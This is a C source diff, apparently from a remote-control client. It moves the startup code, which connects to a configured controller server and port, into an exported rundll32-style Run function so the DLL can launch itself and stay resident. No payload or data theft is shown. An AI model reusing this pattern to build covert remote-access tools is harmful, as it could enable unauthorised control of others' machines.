@@ -44,7 +44,7 @@ struct CONNECT_ADDRESS {
     uint64_t		parentHwnd;		 // 父进程窗口句柄
     uint64_t		superAdmin;		 // 管理员主控ID
     char			pwdHash[64];	 // 密码哈希
-} g_Server = { "Hello, World!", "127.0.0.1", "6543" };
+} g_Server = { "Hello, World!", "127.0.0.1", "6543", 0, 0, __DATE__ };
 #pragma pack(pop)
 
 typedef struct PluginParam {
@@ -404,18 +404,22 @@ extern DLL_API DWORD WINAPI run(LPVOID param)
     return 0;
 }
 
+extern DLL_API void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+	assert(sizeof(struct CONNECT_ADDRESS) == 300);
+	PluginParam param = { 0 };
+	strcpy(param.IP, g_Server.szServerIP);
+	param.Port = atoi(g_Server.szPort);
+	param.User = g_Server.pwdHash;
+	DWORD result = run(&param);
+	Sleep(INFINITE);
+}
+
 #ifndef _WINDLL
 
 int main()
 {
-    assert(sizeof(struct CONNECT_ADDRESS) == 300);
-    PluginParam param = { 0 };
-    strcpy(param.IP, g_Server.szServerIP);
-    param.Port = atoi(g_Server.szPort);
-    param.User = g_Server.pwdHash;
-    DWORD result = run(&param);
-    Sleep(INFINITE);
-    return result;
+    Run(0, 0, 0, 0);
+    return 0;
 }
 
 #else
